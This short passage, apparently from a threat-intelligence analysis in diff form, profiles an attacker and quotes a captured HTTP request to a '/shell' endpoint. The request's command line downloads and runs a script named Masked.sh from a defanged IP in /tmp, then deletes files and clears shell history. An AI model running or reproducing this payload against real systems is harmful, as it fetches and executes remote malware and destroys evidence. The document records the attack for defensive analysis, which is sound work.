@@ -1,0 +1,5 @@
+
+They understand the basics of anonymity, but their desire to “identify” themselves and “claim” their territory is reminiscent of hackers of the ‘80s and ‘90s.
+The attacker has most recently switched to a new attacking IP of 149(.)3.170.237 with the command originating from both of the IPs used in previous attacks.
+GET /shell?cd%20/tmp;%20wget%20http://149(.)3.170.237/Masked.sh;%20chmod%20777%20*;%20sh%20Masked.sh;%20rm%20-rf%20*;%20history%20-c
+HTTP/1.1 The contents of the new shell script point to the same server located on Seychelles Island in the Indian Ocean.
